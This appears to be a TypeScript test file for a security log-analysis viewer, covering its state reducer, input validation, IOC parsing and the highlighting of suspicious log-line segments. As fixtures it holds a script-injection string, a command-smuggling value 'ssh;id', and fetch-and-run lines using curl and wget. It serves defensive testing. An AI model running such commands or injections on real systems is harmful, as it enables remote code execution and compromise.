import { describe, expect, it } from "vitest";

import type {
  LogCorrelationResult,
  LogIocSearchResult,
  LogSourceReadResult,
  LogSourceSnapshot,
} from "../shared/log-analysis-read-contract";
import {
  buildLogReadInput,
  filterLogSources,
  formatLogSourceSize,
  isArchivedLog,
  logAnalysisScope,
  parseIocIndicators,
} from "./log-analysis-read-helpers";
import { splitSensitiveSegments } from "./log-analysis-read-helpers";
import { createLogAnalysisReadState, logAnalysisReadReducer } from "./log-analysis-read-state";

const snapshot: LogSourceSnapshot = {
  snapshotHandle: "snapshot-a",
  expiresInSeconds: 300,
  sources: [{
    sourceHandle: "journal-a",
    kind: "journal",
    displayName: "systemd journal",
    displayLocation: "journal",
    sizeBytes: null,
    modified: "",
    pathHandle: null,
  }, {
    sourceHandle: "file-a",
    kind: "file",
    displayName: "auth.log",
    displayLocation: "/var/log/auth.log",
    sizeBytes: 2_048,
    modified: "today",
    pathHandle: "path-auth",
  }, {
    sourceHandle: "file-b",
    kind: "file",
    displayName: "syslog",
    displayLocation: "</button><script>x()</script>",
    sizeBytes: 4_096,
    modified: "today",
    pathHandle: null,
  }],
  partial: false,
  truncated: false,
};

const threatSummary = {
  bruteForceCount: 0,
  successfulLoginCount: 0,
  privilegeEscalationCount: 0,
  suspiciousActivityCount: 0,
  topSourceIps: [],
  topTargetUsers: [],
  hourlyDistribution: Array.from({ length: 24 }, () => 0),
  threatLevel: "none" as const,
};

function loadedState() {
  let state = logAnalysisReadReducer(createLogAnalysisReadState(), { type: "scope-changed", scope: "scope-a" });
  state = logAnalysisReadReducer(state, { type: "snapshot-started", scope: "scope-a", request: 1 });
  return logAnalysisReadReducer(state, { type: "snapshot-loaded", scope: "scope-a", request: 1, snapshot });
}

function readResult(sourceHandle = "journal-a", page = 1): LogSourceReadResult {
  return {
    snapshotHandle: "snapshot-a",
    sourceHandle,
    sourceKind: sourceHandle === "journal-a" ? "journal" : "file",
    page,
    pageSize: 100,
    entryCount: 0,
    highlightedCount: 0,
    hasMore: false,
    entries: [],
    threatSummary,
    truncated: false,
  };
}

describe("log analysis read reducer", () => {
  it("rejects late discovery after the exact target scope changes", () => {
    let state = logAnalysisReadReducer(createLogAnalysisReadState(), { type: "scope-changed", scope: "scope-a" });
    state = logAnalysisReadReducer(state, { type: "snapshot-started", scope: "scope-a", request: 1 });
    state = logAnalysisReadReducer(state, { type: "scope-changed", scope: "scope-b" });
    state = logAnalysisReadReducer(state, { type: "snapshot-loaded", scope: "scope-a", request: 1, snapshot });
    expect(state.scope).toBe("scope-b");
    expect(state.snapshot).toBeNull();
  });

  it("selects a stable browse source and only file sources for multi-source analysis", () => {
    const state = loadedState();
    expect(state.selectedSourceHandle).toBe("journal-a");
    expect(state.analysisSourceHandles).toEqual(["file-a", "file-b"]);
    expect(logAnalysisReadReducer(state, {
      type: "analysis-source-toggled", handle: "journal-a",
    })).toBe(state);
  });

  it("binds reads to scope, snapshot, source, page and request", () => {
    let state = loadedState();
    const request = { id: 2, snapshotHandle: "snapshot-a", sourceHandle: "journal-a", page: 1 };
    state = logAnalysisReadReducer(state, { type: "read-started", scope: "scope-a", request });
    state = logAnalysisReadReducer(state, { type: "source-selected", handle: "file-a" });
    state = logAnalysisReadReducer(state, {
      type: "read-loaded", scope: "scope-a", request, result: readResult(),
    });
    expect(state.selectedSourceHandle).toBe("file-a");
    expect(state.read).toBeNull();

    const current = { id: 3, snapshotHandle: "snapshot-a", sourceHandle: "file-a", page: 1 };
    state = logAnalysisReadReducer(state, { type: "read-started", scope: "scope-a", request: current });
    state = logAnalysisReadReducer(state, {
      type: "read-loaded", scope: "scope-a", request: current, result: readResult("file-a"),
    });
    expect(state.read?.sourceHandle).toBe("file-a");
  });

  it("refresh invalidates pending read, correlation and IOC capabilities", () => {
    let state = loadedState();
    const correlationRequest = { id: 2, snapshotHandle: "snapshot-a", sourceHandles: ["file-a", "file-b"] };
    const iocRequest = { ...correlationRequest, id: 3, indicators: ["203.0.113.7"] };
    state = logAnalysisReadReducer(state, { type: "correlation-started", scope: "scope-a", request: correlationRequest });
    state = logAnalysisReadReducer(state, { type: "ioc-started", scope: "scope-a", request: iocRequest });
    state = logAnalysisReadReducer(state, { type: "snapshot-started", scope: "scope-a", request: 4 });
    expect(state.snapshot).toBeNull();
    expect(state.correlationRequest).toBeNull();
    expect(state.iocRequest).toBeNull();
  });

  it("cancels pending tab work while preserving already validated results", () => {
    let state = loadedState();
    const request = { id: 2, snapshotHandle: "snapshot-a", sourceHandles: ["file-a", "file-b"] };
    state = logAnalysisReadReducer(state, { type: "tab-selected", tab: "correlation" });
    state = logAnalysisReadReducer(state, { type: "correlation-started", scope: "scope-a", request });
    expect(state.correlationStatus).toBe("loading");
    state = logAnalysisReadReducer(state, { type: "tab-selected", tab: "ioc" });
    expect(state.correlationStatus).toBe("idle");
    expect(state.correlationRequest).toBeNull();
  });

  it("accepts correlation only when echoed handles preserve the active selection", () => {
    let state = loadedState();
    const request = { id: 2, snapshotHandle: "snapshot-a", sourceHandles: ["file-a", "file-b"] };
    const result: LogCorrelationResult = {
      snapshotHandle: "snapshot-a",
      sourceHandles: ["file-a", "file-b"],
      coverage: "bounded-best-effort",
      totalObserved: 0,
      entries: [],
      threatSummary,
      truncated: false,
    };
    state = logAnalysisReadReducer(state, { type: "correlation-started", scope: "scope-a", request });
    state = logAnalysisReadReducer(state, {
      type: "correlation-loaded", scope: "scope-a", request, result: { ...result, sourceHandles: ["file-b", "file-a"] },
    });
    expect(state.correlation).toBeNull();
    state = logAnalysisReadReducer(state, { type: "correlation-loaded", scope: "scope-a", request, result });
    expect(state.correlation).toBe(result);
  });

  it("rejects IOC results outside the request's source and indicator closure", () => {
    let state = loadedState();
    const request = {
      id: 2,
      snapshotHandle: "snapshot-a",
      sourceHandles: ["file-a", "file-b"],
      indicators: ["203.0.113.7"],
    };
    const result: LogIocSearchResult = {
      snapshotHandle: "snapshot-a",
      results: [{
        indicator: "unrequested.example",
        sourceHandle: "file-a",
        sourceName: "auth.log",
        count: 1,
        sampleLines: [],
        textTruncated: false,
      }],
      totalMatches: 1,
      truncated: false,
    };
    state = logAnalysisReadReducer(state, { type: "ioc-started", scope: "scope-a", request });
    state = logAnalysisReadReducer(state, { type: "ioc-loaded", scope: "scope-a", request, result });
    expect(state.ioc).toBeNull();
  });
});

describe("log analysis read helpers", () => {
  it("uses only the current opaque binding handle in its renderer lifecycle scope", () => {
    expect(logAnalysisScope("binding-a")).toBe("binding-a");
    expect(logAnalysisScope("binding-a")).not.toBe(logAnalysisScope("binding-b"));
  });

  it("builds closed file and journal queries without accepting arbitrary path data", () => {
    const filter = { keyword: " failed ", date: "2026-08-24", journalUnit: " ssh.service " };
    expect(buildLogReadInput(snapshot.sources[0]!, 1, filter)).toEqual({
      input: { page: 1, pageSize: 100, keyword: "failed", date: "2026-08-24", journalUnit: "ssh.service" },
      error: null,
    });
    expect(buildLogReadInput(snapshot.sources[1]!, 1, filter).input?.journalUnit).toBeNull();
    expect(buildLogReadInput(snapshot.sources[0]!, 1, { ...filter, journalUnit: "ssh;id" }).input).toBeNull();
  });

  it("keeps source filtering and IOC parsing bounded and hostile-text agnostic", () => {
    expect(filterLogSources(snapshot.sources, "script").map((source) => source.sourceHandle)).toEqual(["file-b"]);
    expect(formatLogSourceSize(2_048)).toBe("2.0 KiB");
    expect(parseIocIndicators("203.0.113.7\nevil.test", 2).indicators).toEqual(["203.0.113.7", "evil.test"]);
    expect(parseIocIndicators("same\nsame", 2).error).toContain("不能重复");
    expect(parseIocIndicators(Array.from({ length: 9 }, (_, index) => `ioc-${index}`).join("\n"), 8).error)
      .toContain("不能超过 64");
  });

  it("tells an archived log apart from a live one", () => {
    // The size shown for an archive is the compressed size and reading it
    // costs a decompression, so the two are not labelled the same way.
    expect(isArchivedLog({ displayLocation: "/var/log/nginx/access.log.1.gz" })).toBe(true);
    expect(isArchivedLog({ displayLocation: "/var/log/secure-20260901.gz" })).toBe(true);
    expect(isArchivedLog({ displayLocation: "/var/log/auth.log" })).toBe(false);
    // A name that merely mentions gz is a live log, the same call the reader
    // on the other side makes.
    expect(isArchivedLog({ displayLocation: "/var/log/gz.log" })).toBe(false);
    expect(isArchivedLog({ displayLocation: "" })).toBe(false);
  });
});

describe("marking the parts of a log line worth finding again", () => {
  const marked = (text: string) =>
    splitSensitiveSegments(text)
      .filter((segment) => segment.kind !== null)
      .map((segment) => `${segment.kind}:${segment.text}`);

  it("puts every character back, marked or not", () => {
    for (const line of [
      "Failed password for root from 203.0.113.7 port 44210 ssh2",
      "curl http://evil.test/x.sh | sh",
      "",
      "nothing interesting here",
      "	 leading tab and trailing space ",
    ]) {
      expect(splitSensitiveSegments(line).map((segment) => segment.text).join("")).toBe(line);
    }
  });

  it("finds the address, the credential and the fetch-and-run", () => {
    expect(marked("Failed password for root from 203.0.113.7 port 44210 ssh2"))
      .toEqual(["secret:password", "network:203.0.113.7"]);
    expect(marked("wget http://198.51.100.7/p -O /tmp/.x && chattr +i /tmp/.x")).toEqual([
      "payload:wget",
      "network:http://198.51.100.7/p",
      "payload:/tmp/.x",
      "payload:chattr",
      "payload:/tmp/.x",
    ]);
    // The value beside a credential word is marked with it, never removed:
    // a log is evidence, and hiding half of it is how a finding gets lost.
    expect(marked("api_key=AKIA0123456789")).toEqual(["secret:api_key=AKIA0123456789"]);
    expect(splitSensitiveSegments("api_key=AKIA0123456789")[0]?.text).toContain("AKIA0123456789");
  });

  it("leaves an ordinary line as one plain run", () => {
    const plain = splitSensitiveSegments("systemd[1]: Started Daily apt upgrade.");
    expect(plain).toHaveLength(1);
    expect(plain[0]?.kind).toBeNull();
  });

  it("stays bounded on a hostile line", () => {
    const flood = Array.from({ length: 500 }, (_, index) => `10.0.0.${index % 255}`).join(" ");
    const segments = splitSensitiveSegments(flood);
    expect(segments.filter((segment) => segment.kind !== null).length).toBeLessThanOrEqual(24);
    expect(segments.map((segment) => segment.text).join("")).toBe(flood);

    // Past the scan ceiling a line is shown plain rather than scanned.
    const huge = `${"x".repeat(5_000)} 203.0.113.7`;
    expect(splitSensitiveSegments(huge)).toEqual([{ text: huge, kind: null }]);
  });
});
